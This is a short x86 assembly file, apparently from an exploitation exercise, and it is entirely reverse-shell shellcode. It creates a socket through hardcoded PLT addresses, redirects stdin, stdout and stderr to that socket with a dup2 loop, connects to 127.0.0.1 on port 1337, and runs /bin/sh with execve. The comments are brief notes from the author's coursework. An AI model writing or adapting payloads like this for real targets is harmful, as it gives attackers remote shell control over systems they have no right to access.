sub esp, 1500 # to clear place at stack

mov eax, 0x08048730 # save the socket at plt address at eax
sub esp, 0x0c # clear place at stack for socket parameters
push 0 # protocol
push 1 # type is SOCK_STREAM
push 2 # family is AF_INET
call eax # call socket.plt function
mov esi, eax # save fd sock fd at esi

# do dup2 in loop for 2 to 0, STDERR, STDOUT, STDIN
mov ecx, 2 # save loop counter and the fd we need to changed
loop:
	sub esp, 0x08 # clear palce at stack for pushes
	mov eax, 0x08048600 # save dup2 address at plt at eax
	push ecx # save fd number we want to "remove" 2 to 0
	push esi # save new fd, the socket fd 
	call eax # call dup2
	dec ecx # dec ecx so we will go on 2 to 0
	jns loop # continue if less then zero (negative)

mov eax, 0x8048750 # save connect address at plt at eax
push 0x0100007f # push ip address 127.0.0.1
pushw 0x3905 # push port 1337
pushw 0x02 # push AF_INET = 2
mov ecx, esp # save ecx as pointer to the sockaddr_t struct
sub esp,0x0c # clear place at stack for pushes
push 0x10 # push sockaddr_t size
push ecx # push the sockaddr_t struct
push esi # push sock fd for connection
call eax # call connext

# the same shellcode as last ex, so didnt expliant
# the only changes are we can insert now '\0' so 
# so I insert then at shellcode now and not make 
# the code change itself
jmp want_bin_bash
got_bin_bash:
xor eax, eax
mov al, 0x0b
pop ebx
xor ecx, ecx
xor edx, edx
int 0x80
want_bin_bash:
call got_bin_bash
.String "/bin/sh"